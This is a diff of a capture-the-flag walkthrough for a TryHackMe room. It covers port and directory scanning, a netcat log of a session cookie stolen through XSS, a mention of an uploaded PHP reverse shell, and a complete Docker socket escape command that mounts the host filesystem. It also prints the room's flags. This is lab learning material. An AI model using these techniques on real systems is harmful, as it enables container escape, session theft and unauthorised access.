@@ -3,7 +3,7 @@
 **Difficulty:** Hard
 **Operating System:** Linux
 **Attacker IP:** 192.168.180.79
-**Machine IP:** 10.113.174.117
+**Machine IP:** 10.81.128.132
 **Domain:** review.thm
 **Room Link:** https://tryhackme.com/room/sequence
 
@@ -15,7 +15,7 @@ Initial machine scanning to identify open ports and running services.
 
 ```bash
 # Nmap Scan
-nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.113.174.117
+nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.81.128.132
 ```
 "",
 " **Full Nmap scan log:** [nmap_pelen_skan.txt](./nmap_pelen_skan.txt)",
@@ -32,7 +32,7 @@ Detailed analysis of open services. For the web server, I ran a hidden directory
 
 ```bash
 # Directory Brute-forcing
-gobuster dir -u 10.113.174.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
+gobuster dir -u 10.81.128.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
 ```
 **Full Gobuster results:** [gobuster_wyniki.txt](./gobuster_wyniki.txt)
 **Interesting Paths / Vulnerabilities Found:**
@@ -78,7 +78,7 @@ Internal Files discovered: /finance.php, /lottery.php.
 
 Potential Architecture: Internal network 192.x (possible Docker environment or SSRF vulnerability).
 
-http://10.113.174.117/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.
+http://10.81.128.132/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.
 
 ### XSS
 After moving around the website, and finally adding it to hosts as review.thm (havent seen that one)  
@@ -108,7 +108,7 @@ But! Its not that easy! HArd to craft something which goes around suspiocious wo
 ```bash
 ❯ nc -lvnp 80
 listening on [any] 80 ...
-connect to [192.168.180.79] from (UNKNOWN) [10.113.174.117] 54096
+connect to [192.168.180.79] from (UNKNOWN) [10.81.128.132] 54096
 GET /?c=PHPSESSID=utu69j5dka8m2pn1i3o9caiv3i HTTP/1.1
 Host: 192.168.180.79
 Connection: keep-alive
@@ -118,7 +118,6 @@ Referer: http://review.thm/
 Accept-Encoding: gzip, deflate
 ```
 Im kinda sure it wasn't supposed to go this way, it had to do something with CSRF (didn't check if I could figure out a process of creating it), but it worked.
-**THM{Adm1NPawned007}**
 <details>
   <summary>🚩 Click to see Admin Flag</summary>
   
@@ -131,12 +130,42 @@ And we do get an access to uploads. Lets craft a reverse shell in php.
 Thats the uploaded path for it. We will runn it the same like we did with finance.php - using feature tab and modyfing the request.
 We do have a shell, lets upgrade it! https://0xffsec.com/handbook/shells/full-tty/
 <img width="561" height="386" alt="image" src="image-2.png" />
-DOcker kurwa
 
+### Docker Escape
+Okay, breathe in, breathe out - we're in docker kurwa.
+There are few ways to escape a Docker, so lets have a look at the first, working one.
+Check containers on main host, and check images over there
+```
+root@4f18a45cca05:/var/run# docker -H unix:///var/run/docker.sock ps
+CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS             PORTS     NAMES
+4f18a45cca05   phpvulnerable   "docker-php-entrypoi…"   10 months ago   Up About an hour   80/tcp    phpVulnerable
+root@4f18a45cca05:/var/run# docker -H unix:///var/run/docker.sock images
+REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
+phpvulnerable   latest    d0bf58293d3b   10 months ago   926MB
+php             8.1-cli   0ead645a9bc2   12 months ago   527MB
 
+```
+Okay, we have smth. We can bind mount that volume (any directory) to our container. So, lets mount whole main host to ours.
+By so, we will craft a command: create me a container, take its main / and mount it inside of /mnt/matka at my side. THen, change the root to it. (optional)
+```
+docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
+```
+```
+root@e585f7ef3710:/# ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
+root@e585f7ef3710:/# cd root
+root@e585f7ef3710:~# ls
+```
+As you can see the root id changed.
+<details>
+  <summary>🚩 Click to see Host Flag</summary>
+  
+  `THM{rootAccessD0n3}`
+</details>
 
 ## 5. Summary and Lessons Learned
 
-* **What went well:** 
-* **What I learned:** 
-* **Where I got stuck (Rabbit holes):** 
+* **What went well:** Recon, XSS
+* **What I learned:** Dockers structure
+* **Where I got stuck (Rabbit holes):** Admin payload - probably found easier than supposed way
